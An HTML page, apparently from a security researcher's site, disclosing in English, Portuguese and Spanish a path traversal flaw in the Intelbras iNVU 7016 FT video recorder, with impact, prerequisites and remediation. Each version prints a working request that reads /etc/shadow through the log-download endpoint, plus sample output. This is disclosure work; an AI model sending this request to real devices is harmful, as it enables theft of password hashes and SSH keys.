@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Path Traversal to Root File Read — Intelbras iNVU 7016 FT | coaglio</title>
+    <link rel="icon" type="image/x-icon" href="../skull.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=Press+Start+2P&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeup.css">
+</head>
+
+<body>
+    <div class="grain"></div>
+
+    <main class="frame">
+        <nav class="site-nav">
+            <a href="../" class="nav-logo">coaglio</a>
+            <div class="nav-right">
+                <div class="nav-links">
+                    <a href="../" data-i18n="nav-home">home</a>
+                    <a href="./" class="active" data-i18n="nav-writeups">writeups</a>
+                    <a href="../htb/" data-i18n="nav-htb">htb</a>
+                </div>
+                <div class="lang-switcher">
+                    <button class="lang-btn active" data-lang="en" onclick="setWriteupLang('en')">EN</button>
+                    <button class="lang-btn" data-lang="pt" onclick="setWriteupLang('pt')">PT</button>
+                    <button class="lang-btn" data-lang="es" onclick="setWriteupLang('es')">ES</button>
+                </div>
+            </div>
+        </nav>
+
+        <a href="./" class="back-link">&larr; <span data-i18n="back-writeups">back to writeups</span></a>
+
+        <!-- ==================== ENGLISH ==================== -->
+        <article class="writeup-content" id="content-en">
+            <header class="writeup-header">
+                <h1>Path Traversal to Root File Read in Intelbras iNVU 7016 FT (LFI)</h1>
+                <div class="writeup-meta">
+                    <time>Jan 2026</time>
+                    <div class="writeup-tags">
+                        <span class="tag">lfi</span>
+                        <span class="tag">path-traversal</span>
+                        <span class="tag">nvr</span>
+                        <span class="tag">iot-security</span>
+                        <span class="tag">intelbras</span>
+                        <span class="tag">cve</span>
+                        <span class="tag">vulnerability-research</span>
+                    </div>
+                </div>
+            </header>
+
+            <div class="card writeup-body">
+                <h2>summary</h2>
+                <p>
+                    Path Traversal vulnerability leading to Local File Inclusion in the
+                    execution log download endpoint of the Intelbras iNVU 7016 FT, a 16-channel
+                    NVR (Network Video Recorder) with AI capabilities. The flaw allows arbitrary
+                    file read with root privileges.
+                </p>
+                <p>
+                    CVE pending.
+                </p>
+
+                <h2>affected product</h2>
+                <ul>
+                    <li><strong>Vendor:</strong> Intelbras</li>
+                    <li><strong>Product:</strong> iNVU 7016 FT</li>
+                    <li><strong>Firmware:</strong> 3.004.00IB000.0.T (Build 2025-09-26)</li>
+                    <li><strong>Web Interface:</strong> 5.031.0.250926.1539217.AI.M.V2</li>
+                    <li><strong>Kernel:</strong> Linux 5.15.73 (aarch64)</li>
+                    <li><strong>CWE:</strong> <a href="https://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noreferrer">CWE-22</a> — Improper Limitation of a Pathname to a Restricted Directory</li>
+                    <li><strong>CVSS v3.1:</strong> 7.7 (High) — <code>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N</code></li>
+                </ul>
+
+                <h2>background</h2>
+                <p>
+                    the iNVU 7016 FT is a professional-grade NVR with 16 channels and built-in
+                    AI features like facial recognition, license plate recognition (LPR), and PPE
+                    detection. widely deployed in corporate environments. runs embedded Linux on
+                    aarch64.
+                </p>
+                <p>
+                    the firmware versioning suffix "IB" and the use of the JSON-RPC interface
+                    at <code>/RPC2</code> indicate this product is based on the Dahua codebase.
+                    this is relevant because the same vulnerability likely affects other OEM
+                    devices sharing this codebase.
+                </p>
+
+                <h2>discovery</h2>
+                <p>
+                    found during an authorized security assessment in a controlled environment.
+                    the affected functionality is the execution log file download, accessible
+                    under "Advanced Maintenance > Execution Logs" in the admin panel.
+                </p>
+                <p>
+                    the page lists log files and allows downloading them. intercepting the
+                    request with Burp Suite revealed the file path is passed directly in the
+                    URL with no proper validation.
+                </p>
+
+                <h2>technical details</h2>
+                <p>
+                    legitimate request to download a log file:
+                </p>
+                <pre><code>GET /RPC2_Loadfile/syslog/&lt;device_model&gt;_&lt;serial_number&gt;@syslog HTTP/1.1
+Host: &lt;target&gt;
+Cookie: WebClientHttpSessionID=&lt;valid_session&gt;</code></pre>
+                <p>
+                    by injecting directory traversal sequences into the path:
+                </p>
+                <pre><code>GET /RPC2_Loadfile/syslog/../../../../etc/shadow HTTP/1.1
+Host: &lt;target&gt;
+Cookie: WebClientHttpSessionID=&lt;valid_session&gt;</code></pre>
+                <p>
+                    the server responds with HTTP 200 and the file contents:
+                </p>
+                <pre><code>HTTP/1.1 200 OK
+X-XSS-Protection: 1;mode=block
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'
+Strict-Transport-Security: max-age=604800; includeSubDomains
+Content-type: application/http
+
+root:x:0:0:root:/root:/bin/dsh
+[...]
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+admin:x:0:502:Linux User,,,:/:/bin/dsh</code></pre>
+                <p>
+                    the response confirms arbitrary file read. the <code>/bin/dsh</code>
+                    shell and the user structure are consistent with Dahua-based embedded
+                    Linux firmware. the same technique was validated against
+                    <code>/etc/shadow</code>, <code>/etc/ssh/ssh_host_dsa_key</code>, and
+                    other sensitive files.
+                </p>
+                <!-- [TODO: add redacted screenshot of the response here] -->
+
+                <h2>impact</h2>
+                <p>
+                    the web application runs as root, confirmed by the successful read of
+                    <code>/etc/shadow</code> (which requires elevated privileges). this
+                    significantly amplifies the impact:
+                </p>
+                <ul>
+                    <li>read password hashes (<code>/etc/shadow</code>)</li>
+                    <li>read SSH private keys (<code>/etc/ssh/ssh_host_dsa_key</code>)</li>
+                    <li>read configuration files with hardcoded credentials</li>
+                    <li>potential escalation to Remote Code Execution depending on other vectors</li>
+                </ul>
+
+                <h2>exploitation prerequisites</h2>
+                <p>
+                    exploitation requires:
+                </p>
+                <ul>
+                    <li>valid authentication on the web interface</li>
+                    <li>user belonging to a group with one of the following permissions:
+                        "Storage", "Maintenance", or "System"</li>
+                </ul>
+                <p>
+                    worth noting: these permissions are not exclusive to the global admin.
+                    a user with just "Storage" permission, for example, can also exploit
+                    this vulnerability.
+                </p>
+
+                <h2>remediation</h2>
+                <ul>
+                    <li>implement a whitelist of allowed directories for file download</li>
+                    <li>normalize paths (canonical path) and validate the resolved file is inside the allowed directory</li>
+                    <li>sanitize input by blocking path traversal patterns (<code>../</code>, alternate encodings)</li>
+                    <li>apply least privilege: the web application should not run as root</li>
+                    <li>review user group permissions and restrict sensitive capabilities</li>
+                </ul>
+
+                <h2>references</h2>
+                <ul>
+                    <li><a href="https://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noreferrer">CWE-22: Improper Limitation of a Pathname to a Restricted Directory</a></li>
+                    <li><a href="https://owasp.org/www-community/attacks/Path_Traversal" target="_blank" rel="noreferrer">OWASP — Path Traversal</a></li>
+                    <li>VulDB submission: [LINK_VULDB]</li>
+                </ul>
+            </div>
+        </article>
+
+        <!-- ==================== PORTUGUÊS ==================== -->
+        <article class="writeup-content" id="content-pt" style="display:none;">
+            <header class="writeup-header">
+                <h1>Path Traversal para Leitura de Arquivos como Root no Intelbras iNVU 7016 FT (LFI)</h1>
+                <div class="writeup-meta">
+                    <time>Jan 2026</time>
+                    <div class="writeup-tags">
+                        <span class="tag">lfi</span>
+                        <span class="tag">path-traversal</span>
+                        <span class="tag">nvr</span>
+                        <span class="tag">iot-security</span>
+                        <span class="tag">intelbras</span>
+                        <span class="tag">cve</span>
+                        <span class="tag">vulnerability-research</span>
+                    </div>
+                </div>
+            </header>
+
+            <div class="card writeup-body">
+                <h2>resumo</h2>
+                <p>
+                    vulnerabilidade de Path Traversal levando a Local File Inclusion no endpoint
+                    de download de logs de execução do Intelbras iNVU 7016 FT, um NVR (Network
+                    Video Recorder) de 16 canais com recursos de IA. a falha permite leitura
+                    arbitrária de arquivos do sistema com privilégios de root.
+                </p>
+                <p>
+                    CVE pendente.
+                </p>
+
+                <h2>produto afetado</h2>
+                <ul>
+                    <li><strong>Fabricante:</strong> Intelbras</li>
+                    <li><strong>Produto:</strong> iNVU 7016 FT</li>
+                    <li><strong>Firmware:</strong> 3.004.00IB000.0.T (Build 2025-09-26)</li>
+                    <li><strong>Interface Web:</strong> 5.031.0.250926.1539217.AI.M.V2</li>
+                    <li><strong>Kernel:</strong> Linux 5.15.73 (aarch64)</li>
+                    <li><strong>CWE:</strong> <a href="https://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noreferrer">CWE-22</a> — Improper Limitation of a Pathname to a Restricted Directory</li>
+                    <li><strong>CVSS v3.1:</strong> 7.7 (High) — <code>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N</code></li>
+                </ul>
+
+                <h2>contexto</h2>
+                <p>
+                    o iNVU 7016 FT é um NVR profissional com 16 canais e recursos de IA
+                    embarcados: reconhecimento facial, leitura de placas (LPR) e detecção de
+                    EPI. bastante usado em projetos corporativos. roda Linux embarcado em
+                    aarch64.
+                </p>
+                <p>
+                    o sufixo "IB" no versionamento do firmware e o uso da interface JSON-RPC
+                    em <code>/RPC2</code> indicam que o produto é baseado na codebase Dahua.
+                    isso é relevante porque a mesma vulnerabilidade provavelmente afeta outros
+                    dispositivos OEM que compartilham essa base de código.
+                </p>
+
+                <h2>descoberta</h2>
+                <p>
+                    identificada durante uma avaliação de segurança autorizada em ambiente
+                    controlado. a funcionalidade afetada é o download de arquivos de log de
+                    execução, acessível em "Manutenção avançada > Registros de execução" no
+                    painel administrativo.
+                </p>
+                <p>
+                    a página lista arquivos de log e permite download. ao interceptar a
+                    requisição com Burp Suite, o caminho do arquivo era passado direto na URL
+                    sem validação adequada.
+                </p>
+
+                <h2>detalhes técnicos</h2>
+                <p>
+                    requisição legítima pra baixar um log:
+                </p>
+                <pre><code>GET /RPC2_Loadfile/syslog/&lt;device_model&gt;_&lt;serial_number&gt;@syslog HTTP/1.1
+Host: &lt;target&gt;
+Cookie: WebClientHttpSessionID=&lt;valid_session&gt;</code></pre>
+                <p>
+                    injetando sequências de directory traversal no path:
+                </p>
+                <pre><code>GET /RPC2_Loadfile/syslog/../../../../etc/shadow HTTP/1.1
+Host: &lt;target&gt;
+Cookie: WebClientHttpSessionID=&lt;valid_session&gt;</code></pre>
+                <p>
+                    o servidor responde com HTTP 200 e o conteudo do arquivo:
+                </p>
+                <pre><code>HTTP/1.1 200 OK
+X-XSS-Protection: 1;mode=block
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'
+Strict-Transport-Security: max-age=604800; includeSubDomains
+Content-type: application/http
+
+root:x:0:0:root:/root:/bin/dsh
+[...]
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+admin:x:0:502:Linux User,,,:/:/bin/dsh</code></pre>
+                <p>
+                    a resposta confirma leitura arbitraria de arquivos. o shell
+                    <code>/bin/dsh</code> e a estrutura de usuarios sao consistentes com
+                    firmware Linux embarcado baseado em Dahua. a mesma tecnica foi validada
+                    contra <code>/etc/shadow</code>,
+                    <code>/etc/ssh/ssh_host_dsa_key</code>, e outros arquivos sensiveis.
+                </p>
+                <!-- [TODO: adicionar screenshot redactado da resposta aqui] -->
+
+                <h2>impacto</h2>
+                <p>
+                    a aplicação web roda como root, validado pela leitura bem-sucedida de
+                    <code>/etc/shadow</code> (que exige privilégios elevados). isso amplia
+                    significativamente o impacto:
+                </p>
+                <ul>
+                    <li>leitura de hashes de senha (<code>/etc/shadow</code>)</li>
+                    <li>leitura de chaves privadas SSH (<code>/etc/ssh/ssh_host_dsa_key</code>)</li>
+                    <li>leitura de arquivos de configuração com credenciais hardcoded</li>
+                    <li>potencial escalação pra Remote Code Execution dependendo de outros vetores</li>
+                </ul>
+
+                <h2>pré-requisitos de exploração</h2>
+                <p>
+                    a exploração requer:
+                </p>
+                <ul>
+                    <li>autenticação válida na interface web</li>
+                    <li>usuário pertencente a grupo com uma das permissões:
+                        "Armazenamento", "Manutenção" ou "Sistema"</li>
+                </ul>
+                <p>
+                    importante: essas permissões não são exclusivas do admin global.
+                    um usuário com permissão pontual de "Armazenamento", por exemplo,
+                    também consegue explorar.
+                </p>
+
+                <h2>remediação</h2>
+                <ul>
+                    <li>implementar whitelist de diretórios permitidos pro download</li>
+                    <li>normalizar caminhos (canonical path) e validar se o arquivo resolvido está dentro do diretório autorizado</li>
+                    <li>sanitizar input bloqueando padrões de path traversal (<code>../</code>, codificações alternativas)</li>
+                    <li>aplicar princípio do menor privilégio: a aplicação web não deveria rodar como root</li>
+                    <li>revisar permissões dos grupos de usuários e restringir capacidades sensíveis</li>
+                </ul>
+
+                <h2>referências</h2>
+                <ul>
+                    <li><a href="https://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noreferrer">CWE-22: Improper Limitation of a Pathname to a Restricted Directory</a></li>
+                    <li><a href="https://owasp.org/www-community/attacks/Path_Traversal" target="_blank" rel="noreferrer">OWASP — Path Traversal</a></li>
+                    <li>VulDB submission: [LINK_VULDB]</li>
+                </ul>
+            </div>
+        </article>
+
+        <!-- ==================== ESPAÑOL ==================== -->
+        <article class="writeup-content" id="content-es" style="display:none;">
+            <header class="writeup-header">
+                <h1>Path Traversal a Lectura de Archivos como Root en Intelbras iNVU 7016 FT (LFI)</h1>
+                <div class="writeup-meta">
+                    <time>Ene 2026</time>
+                    <div class="writeup-tags">
+                        <span class="tag">lfi</span>
+                        <span class="tag">path-traversal</span>
+                        <span class="tag">nvr</span>
+                        <span class="tag">iot-security</span>
+                        <span class="tag">intelbras</span>
+                        <span class="tag">cve</span>
+                        <span class="tag">vulnerability-research</span>
+                    </div>
+                </div>
+            </header>
+
+            <div class="card writeup-body">
+                <h2>resumen</h2>
+                <p>
+                    vulnerabilidad de Path Traversal que lleva a Local File Inclusion en el
+                    endpoint de descarga de logs de ejecución del Intelbras iNVU 7016 FT, un
+                    NVR (Network Video Recorder) de 16 canales con capacidades de IA. la falla
+                    permite lectura arbitraria de archivos del sistema con privilegios de root.
+                </p>
+                <p>
+                    CVE pendiente.
+                </p>
+
+                <h2>producto afectado</h2>
+                <ul>
+                    <li><strong>Fabricante:</strong> Intelbras</li>
+                    <li><strong>Producto:</strong> iNVU 7016 FT</li>
+                    <li><strong>Firmware:</strong> 3.004.00IB000.0.T (Build 2025-09-26)</li>
+                    <li><strong>Interfaz Web:</strong> 5.031.0.250926.1539217.AI.M.V2</li>
+                    <li><strong>Kernel:</strong> Linux 5.15.73 (aarch64)</li>
+                    <li><strong>CWE:</strong> <a href="https://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noreferrer">CWE-22</a> — Improper Limitation of a Pathname to a Restricted Directory</li>
+                    <li><strong>CVSS v3.1:</strong> 7.7 (High) — <code>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N</code></li>
+                </ul>
+
+                <h2>contexto</h2>
+                <p>
+                    el iNVU 7016 FT es un NVR profesional con 16 canales y funciones de IA
+                    integradas: reconocimiento facial, lectura de patentes (LPR) y detección
+                    de EPP. bastante usado en proyectos corporativos. corre Linux embebido en
+                    aarch64.
+                </p>
+                <p>
+                    el sufijo "IB" en el versionado del firmware y el uso de la interfaz
+                    JSON-RPC en <code>/RPC2</code> indican que el producto está basado en el
+                    codebase de Dahua. esto es relevante porque la misma vulnerabilidad
+                    probablemente afecta a otros dispositivos OEM que comparten esta base
+                    de código.
+                </p>
+
+                <h2>descubrimiento</h2>
+                <p>
+                    identificada durante una evaluación de seguridad autorizada en un ambiente
+                    controlado. la funcionalidad afectada es la descarga de archivos de log de
+                    ejecución, accesible en "Mantenimiento avanzado > Registros de ejecución"
+                    en el panel administrativo.
+                </p>
+                <p>
+                    la página lista archivos de log y permite descargarlos. al interceptar la
+                    solicitud con Burp Suite, la ruta del archivo se pasaba directo en la URL
+                    sin validación adecuada.
+                </p>
+
+                <h2>detalles técnicos</h2>
+                <p>
+                    solicitud legítima para descargar un log:
+                </p>
+                <pre><code>GET /RPC2_Loadfile/syslog/&lt;device_model&gt;_&lt;serial_number&gt;@syslog HTTP/1.1
+Host: &lt;target&gt;
+Cookie: WebClientHttpSessionID=&lt;valid_session&gt;</code></pre>
+                <p>
+                    inyectando secuencias de directory traversal en el path:
+                </p>
+                <pre><code>GET /RPC2_Loadfile/syslog/../../../../etc/shadow HTTP/1.1
+Host: &lt;target&gt;
+Cookie: WebClientHttpSessionID=&lt;valid_session&gt;</code></pre>
+                <p>
+                    el servidor responde con HTTP 200 y el contenido del archivo:
+                </p>
+                <pre><code>HTTP/1.1 200 OK
+X-XSS-Protection: 1;mode=block
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'
+Strict-Transport-Security: max-age=604800; includeSubDomains
+Content-type: application/http
+
+root:x:0:0:root:/root:/bin/dsh
+[...]
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+admin:x:0:502:Linux User,,,:/:/bin/dsh</code></pre>
+                <p>
+                    la respuesta confirma lectura arbitraria de archivos. el shell
+                    <code>/bin/dsh</code> y la estructura de usuarios son consistentes con
+                    firmware Linux embebido basado en Dahua. la misma tecnica fue validada
+                    contra <code>/etc/shadow</code>,
+                    <code>/etc/ssh/ssh_host_dsa_key</code>, y otros archivos sensibles.
+                </p>
+                <!-- [TODO: agregar screenshot redactado de la respuesta acá] -->
+
+                <h2>impacto</h2>
+                <p>
+                    la aplicación web corre como root, validado por la lectura exitosa de
+                    <code>/etc/shadow</code> (que requiere privilegios elevados). esto amplifica
+                    significativamente el impacto:
+                </p>
+                <ul>
+                    <li>lectura de hashes de contraseña (<code>/etc/shadow</code>)</li>
+                    <li>lectura de claves privadas SSH (<code>/etc/ssh/ssh_host_dsa_key</code>)</li>
+                    <li>lectura de archivos de configuración con credenciales hardcoded</li>
+                    <li>potencial escalación a Remote Code Execution dependiendo de otros vectores</li>
+                </ul>
+
+                <h2>prerequisitos de explotación</h2>
+                <p>
+                    la explotación requiere:
+                </p>
+                <ul>
+                    <li>autenticación válida en la interfaz web</li>
+                    <li>usuario perteneciente a un grupo con uno de los siguientes permisos:
+                        "Almacenamiento", "Mantenimiento" o "Sistema"</li>
+                </ul>
+                <p>
+                    importante: estos permisos no son exclusivos del admin global.
+                    un usuario con solo el permiso de "Almacenamiento", por ejemplo,
+                    también puede explotar esta vulnerabilidad.
+                </p>
+
+                <h2>remediación</h2>
+                <ul>
+                    <li>implementar whitelist de directorios permitidos para la descarga</li>
+                    <li>normalizar rutas (canonical path) y validar que el archivo resuelto esté dentro del directorio autorizado</li>
+                    <li>sanitizar input bloqueando patrones de path traversal (<code>../</code>, codificaciones alternativas)</li>
+                    <li>aplicar principio de menor privilegio: la aplicación web no debería correr como root</li>
+                    <li>revisar permisos de los grupos de usuarios y restringir capacidades sensibles</li>
+                </ul>
+
+                <h2>referencias</h2>
+                <ul>
+                    <li><a href="https://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noreferrer">CWE-22: Improper Limitation of a Pathname to a Restricted Directory</a></li>
+                    <li><a href="https://owasp.org/www-community/attacks/Path_Traversal" target="_blank" rel="noreferrer">OWASP — Path Traversal</a></li>
+                    <li>VulDB submission: [LINK_VULDB]</li>
+                </ul>
+            </div>
+        </article>
+
+        <a href="./" class="back-link">&larr; <span data-i18n="back-writeups">back to writeups</span></a>
+
+        <footer class="foot">
+            <p>&copy; <span id="copyright-year">2025</span> coaglio.</p>
+        </footer>
+    </main>
+
+    <script src="../i18n.js"></script>
+    <script>
+        function setWriteupLang(lang) {
+            document.querySelectorAll(".writeup-content").forEach(el => el.style.display = "none");
+            const target = document.getElementById("content-" + lang);
+            if (target) target.style.display = "block";
+            document.documentElement.lang = lang;
+            localStorage.setItem("lang", lang);
+            document.querySelectorAll(".lang-btn").forEach(btn => {
+                btn.classList.toggle("active", btn.dataset.lang === lang);
+            });
+        }
+
+        const saved = localStorage.getItem("lang") || "en";
+        setWriteupLang(saved);
+        document.getElementById("copyright-year").textContent = new Date().getFullYear();
+    </script>
+
+</body>
+
+</html>
